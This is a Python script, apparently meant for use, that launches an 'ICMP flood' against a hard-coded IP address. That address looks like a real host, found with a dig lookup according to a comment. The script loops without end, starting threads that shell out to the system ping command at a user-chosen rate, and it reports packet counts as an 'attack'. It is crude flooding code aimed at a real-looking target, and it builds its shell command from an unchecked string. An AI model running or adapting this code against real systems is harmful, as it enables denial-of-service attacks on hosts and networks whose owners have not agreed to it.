import os
import platform
import subprocess
import time
import threading

def send_icmp_pings(target_ip, count=100):
    system = platform.system()
    
    if system == "Windows":
        command = f"ping -n {count} {target_ip}"
    else:
        command = f"ping -c {count} {target_ip}"
    
    try:
        subprocess.run(command, shell=True)
        return True
    except Exception as e:
        print(f"Error sending ICMP pings: {e}")
        return False

def start_flood(target_ip, packets_per_second=100):
    print(f"Starting ICMP flood on {target_ip}...")
    print("The program is running. Press Ctrl+C to stop it.\n")
    
    count = 0
    
    try:
        while True:
            # Create a new thread to send a batch of pings
            ping_thread = threading.Thread(
                target=send_icmp_pings, 
                args=(target_ip, packets_per_second)
            )
            ping_thread.start()
            ping_thread.join(timeout=1)  # Wait 1 second before the next batch
            count += packets_per_second
            
            # Print confirmation for EVERY packet
            print(f"Sent {count} packets...")

    except KeyboardInterrupt:
        print("\n" + "="*50)
        print(f"Attack stopped by user.")
        print(f"Total packets sent: {count}")
        print("="*50)
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}")

if __name__ == "__main__":
    # PASTE THE IP ADDRESS HERE FROM THE DIG COMMAND
    # If you don't have it yet, use this placeholder:
    target_ip = "172.67.158.228" 
    
    print(f"Target IP: {target_ip}")
    packets = int(input("Enter packets per second: ") or 100)
    
    start_flood(target_ip, packets)
